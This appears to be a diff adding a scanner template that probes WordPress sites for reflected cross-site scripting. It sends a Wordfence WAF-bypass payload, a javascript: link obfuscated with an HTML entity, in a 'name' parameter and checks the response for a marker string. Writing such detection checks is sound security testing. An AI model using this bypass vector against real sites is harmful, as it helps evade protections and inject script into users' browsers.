@@ -1,0 +1,22 @@
+id: patt-xss-wf-01-name
+name: 'PATT xss patt-xss-wf-01 via name'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafwordfence
+requires:
+  - wordpress
+description: 'PATT WordFence 12 Sep 2018 (@brutelogic): entity &#99; mid-scheme. [patt:patt-xss-wf-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '<a href=javas&#99;ript:nxp0033>x'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0033'
